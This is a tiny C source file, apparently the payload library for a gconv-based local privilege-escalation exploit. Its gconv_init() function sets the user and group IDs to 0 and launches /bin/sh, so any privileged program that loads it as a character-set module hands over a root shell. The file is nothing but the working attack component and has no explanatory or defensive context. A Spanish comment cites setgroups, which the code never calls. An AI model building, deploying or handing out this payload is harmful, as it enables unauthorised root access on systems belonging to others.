#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <grp.h> // Encabezado necesario para setgroups

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    
    execve("/bin/sh", NULL, NULL);
}

